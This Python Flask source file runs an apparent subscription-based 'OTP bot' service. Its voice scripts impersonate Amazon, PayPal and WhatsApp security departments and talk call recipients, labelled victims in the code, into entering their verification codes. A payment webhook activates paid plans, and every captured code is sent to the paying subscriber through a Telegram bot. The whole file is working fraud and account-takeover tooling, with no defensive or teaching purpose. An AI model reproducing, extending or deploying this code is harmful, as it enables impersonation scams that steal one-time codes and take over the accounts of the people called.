from flask import Flask, request, jsonify, Response
from threading import Thread
from database import add_subscription_days, get_user_script
from config import bot
from twilio.twiml.voice_response import VoiceResponse, Gather
from logger import send_log, log_error 
import json

app = Flask('')

# ==========================================
# 📜 SCRIPTS POR DEFECTO (FALLBACK)
# ==========================================
DEFAULT_SCRIPTS = {
    "amazon": (
        "Hello. This is Amazon Security Department. "
        "We detected a suspicious purchase on your account. "
        "Please enter the verification code sent to your mobile device to cancel this order."
    ),
    "paypal": (
        "Hello. This is PayPal Fraud Prevention. "
        "A login attempt was made from a new device. "
        "To block this sign-in, please enter the security code sent to your text messages."
    ),
    "whatsapp": (
        "Hi. This is WhatsApp Support. "
        "Someone is trying to register your number on a new device. "
        "To prevent account theft, please enter the verification code displayed on your screen."
    ),
    "default": (
        "Hello. This is an automated security call from {service}. "
        "We detected unauthorized activity on your account. "
        "Please enter the verification code sent to your mobile device to verify your identity."
    )
}

@app.route('/')
def home():
    return "Mussolini OTP Bot - Systems Online."

# ==========================================
# 1. WEBHOOK HOODPAY (PAGOS)
# ==========================================
@app.route('/webhook/hoodpay', methods=['POST'])
def hoodpay_webhook():
    try:
        data = request.json
        status = data.get("status", "").upper()
        
        if status in ["COMPLETED", "PAID", "SUCCESS"]:
            metadata = data.get("metadata", {})
            user_id = metadata.get("user_id")
            plan_type = metadata.get("plan_type")
            
            if user_id and plan_type:
                days = 1
                if "weekly" in plan_type: days = 7
                elif "monthly" in plan_type: days = 30
                
                success, new_date = add_subscription_days(user_id, days)
                
                if success:
                    try:
                        bot.send_message(user_id, f"✅ **Payment Received!**\nPlan `{plan_type}` active until `{new_date}`.", parse_mode="Markdown")
                        send_log(f"Pago Recibido: User {user_id} - Plan {plan_type}", level="PAYMENT")
                    except: pass
                
                return jsonify({"status": "success"}), 200
        return jsonify({"status": "ignored"}), 200
    except Exception as e:
        log_error(e, "Hoodpay Webhook")
        return jsonify({"status": "error"}), 500

# ==========================================
# 2. WEBHOOK TWILIO - GENERADOR DE VOZ
# ==========================================
@app.route('/twilio/voice', methods=['POST'])
def twilio_voice():
    """Twilio pregunta: ¿Qué le digo a la víctima?"""
    service_raw = request.args.get('service', 'Security')
    user_id = request.args.get('user_id')
    
    service_key = service_raw.lower()
    
    # 1. BUSCAR SCRIPT PERSONALIZADO EN BASE DE DATOS
    # Esto devuelve una tupla: (texto, idioma) ej: ("Hola soy Amazon", "es-MX")
    custom_data = get_user_script(user_id, service_key)
    
    if custom_data:
        # ✅ Usamos el script del usuario
        say_text = custom_data[0]
        language = custom_data[1]
    else:
        # ⚠️ Usamos el default (Inglés)
        language = 'en-US'
        if service_key in DEFAULT_SCRIPTS:
            say_text = DEFAULT_SCRIPTS[service_key]
        else:
            say_text = DEFAULT_SCRIPTS["default"].format(service=service_raw)
    
    resp = VoiceResponse()
    
    # Configurar Gather (Captura de teclas)
    gather = Gather(num_digits=8, action=f'/twilio/gather?user_id={user_id}&service={service_raw}', method='POST', timeout=10)
    
    # IMPORTANTE: Le pasamos el 'language' dinámico a Twilio para el acento
    gather.say(say_text, voice='alice', language=language)
    
    resp.append(gather)
    resp.say("No input received. Goodbye.", voice='alice')
    
    return Response(str(resp), mimetype='text/xml')

# ==========================================
# 3. WEBHOOK TWILIO - RESULTADO (CAPTURA)
# ==========================================
@app.route('/twilio/gather', methods=['POST'])
def twilio_gather():
    digits = request.values.get('Digits')
    user_id = request.args.get('user_id')
    service = request.args.get('service')
    
    resp = VoiceResponse()

    if digits and user_id:
        try:
            bot.send_message(user_id, f"🎹 **OTP CAPTURED!**\n👤 Service: {service}\n🔢 Code: `{digits}`", parse_mode="Markdown")
            send_log(f"OTP Capturado para {user_id}: {digits}", level="SUCCESS")
        except: pass

        # Despedida genérica
        resp.say("Thank you. Your account is verified.", voice='alice')
    else:
        resp.say("Invalid input.", voice='alice')

    return Response(str(resp), mimetype='text/xml')

def run():
    app.run(host='0.0.0.0', port=8080)

def start_server():
    t = Thread(target=run)
    t.start()
